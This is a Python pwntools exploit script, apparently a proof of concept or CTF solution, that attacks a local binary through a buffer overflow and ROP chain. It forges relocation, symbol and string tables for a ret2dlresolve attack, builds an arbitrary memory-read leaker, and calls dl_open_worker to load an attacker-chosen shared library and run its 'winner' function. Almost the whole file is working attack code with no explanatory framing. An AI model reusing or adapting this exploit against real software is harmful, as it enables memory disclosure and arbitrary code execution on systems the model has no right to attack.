#!/usr/bin/env python3

from pwn import *
import pwnlib

# Process
io = None

# Files
t = context.binary = ELF("/io/poc")
# t = context.binary = ELF("/io/poc_ctf")

"""
Fake sections
"""
rw_area = (t.sym["__bss_start"] + 0x100) & ~0xFF
f_nent = 2  # nr of fake entries

# fake relocation table
rela_plt = t.dynamic_value_by_tag("DT_JMPREL")
rela_plt_entsz = 0x18  # sizeof(Elf64_Rela)
f_rela_plt = rw_area
f_rela_plt_ent = f_nent
f_rela_plt_offset = (f_rela_plt - rela_plt) // rela_plt_entsz

# fake symbol table
dynsym = t.dynamic_value_by_tag("DT_SYMTAB")
dynsym_entsz = 0x18  # sizeof(Elf64_Sym)
f_dynsym = f_rela_plt + rela_plt_entsz * f_rela_plt_ent + 0x10  # align
f_dynsym_ent = f_nent
f_dynsym_offset = (f_dynsym - dynsym) // dynsym_entsz

# fake dl_open_args
f_dl_open_args = f_dynsym + dynsym_entsz * f_dynsym_ent
f_dl_open_args_count = 1
f_dl_open_args_sz = 0x48  # sizeof(struct dl_open_args)

# fake string table
dynstr = t.dynamic_value_by_tag("DT_STRTAB")
f_dynstr = f_dl_open_args + f_dl_open_args_sz * f_dl_open_args_count
f_strings = b"winner\x00./libabe.so\x00write\x00"
f_dynstr_sz = len(f_strings)
f_dynstr_offset = f_dynstr - dynstr

# fake got to store resolved addresses
f_got = f_dynstr + f_dynstr_sz
got_entsz = 0x8
f_got_sz = f_nent * got_entsz

# emits reloc_arg for the i'th fake relocation entry
def reloc_arg(i):
    return f_rela_plt_offset + i


# emits fake Elf64_Rela, referencing fake symbol
# f_r_sym: index in fake symbol table
def relocation_entry(f_r_sym):
    rel = p64(f_got + got_entsz * f_r_sym)  # resolved addr written here
    rel += p64(((f_dynsym_offset + f_r_sym) << 32) | 7)
    rel += p64(0)  # no addend
    return rel


# emits fake Elf64_Sym, referencing fake string
# f_st_name: offset into fake string table
def symbol_entry(f_st_name):
    sym = p32(f_dynstr_offset + f_st_name)  # st_name
    sym += p8((1 << 4) | 2)  # st_info = STB_GLOBAL | STT_FUNC
    sym += b"\x00" * (dynsym_entsz - len(sym))
    return sym


# emits fake struct dl_open_args (dl_open_worker)
# file: offset into fake sting table
def dl_open_args(file):
    arg = p64(f_dynstr + file)  # char* file
    arg += p32(0x80000000 | 0x101)  # int mode = RTLD_LAYZ | RTLD_GLOBAL | __RTLD_DLOPEN
    arg += p32(0x1337)  # padding
    arg += p64(t.sym.main)  # void* caller_dlopen
    arg += p64(0)  # struct link_map* map
    arg += p64(2**64 - 2)  # Lmid_t nsid = -2
    arg += p64(0)  # int and char stuff
    arg += p64(0)  # argc
    arg += p64(0)  # argv
    arg += p64(0)  # envp
    return arg


"""
ROP Gadgets
"""
t_rop = ROP(t)

p_rdx = None  # in libc
p_rdi = t_rop.rdi.address
p_rsi_r15 = t_rop.rsi.address
dl_plt = t.get_section_by_name(".plt").header.sh_addr  # the ret2dl gadget

"""
Arbirtrary read
"""
size = 0x1337


@pwnlib.memleak.MemLeak
def leaker(addr):
    global io, p_rdx, size
    print(f"Leaking {size} bytes at {hex(addr)}")

    io.clean()
    p = 0x9 * b"A"
    p += p64(p_rdi)
    p += p64(1)  # rdi = STDOUT
    p += p64(p_rsi_r15)
    p += p64(addr)  # rsi = addr
    p += p64(0xDEADBEEF)  # filler
    if p_rdx:
        p += p64(p_rdx)
        p += p64(size)  # rdx = size
    p += p64(dl_plt)
    p += p64(reloc_arg(1))  # write(1, addr, size)
    p += p64(t.sym.main)
    io.send(p)

    return io.recvn(size)


"""
Exploit
"""


def connect_ctf():
    context.log_level = "info"
    return remote("localhost", 1024)


def connect():
    context.log_level = "info"
    return process("/io/poc")


def debug():
    gdbscript = """
    b main
    ignore 1 1
    continue
    """
    context.log_level = "debug"
    return gdb.debug("/io/poc", gdbscript=gdbscript)


def main():
    global io, libc
    # io = debug()
    # io = connect_ctf()
    io = connect()

    # Stage 1: Call read, return to main
    s1 = 0x9 * b"A"
    s1 += p64(p_rsi_r15)
    s1 += p64(rw_area)
    s1 += 0x8 * b"A"
    s1 += p64(t.plt.read)  # read(0, rw_area. 0x1337)
    s1 += p64(t.sym.main)
    io.send(s1)
    io.clean()

    # Stage 2: Write fake sections
    s2 = relocation_entry(0)
    s2 += relocation_entry(1)
    s2 += 0x10 * b"A"  # align
    s2 += symbol_entry(0)  # winner
    s2 += symbol_entry(19)  # write
    s2 += dl_open_args(7)  # ./libabe.so
    s2 += f_strings
    io.send(s2)
    io.clean()

    # Version 3: dl_open_worker + call winner

    leak = leaker._leak(
        t.got.read - 0x1337 + 0x8, 0x1337
    )  # find address of _dl_runtime_resolve stored in got[2]
    # ret2dl_open_worker, analyze your DL to find offset
    dl_open_worker = (
        u64(leak[-16:-8]) - 0x6FA0
    )  # dl_open_worker = _dl_runtime_resolve - 0x6fa0
    s4 = 0x9 * b"A"
    s4 += p64(p_rdi)
    s4 += p64(f_dl_open_args)  # ./libabe.so
    s4 += p64(dl_open_worker)  # dl_open_worker(f_dl_open_args)
    s4 += p64(dl_plt)
    s4 += p64(reloc_arg(0))  # winner
    io.send(s4)

    print(io.clean())


if __name__ == "__main__":
    main()
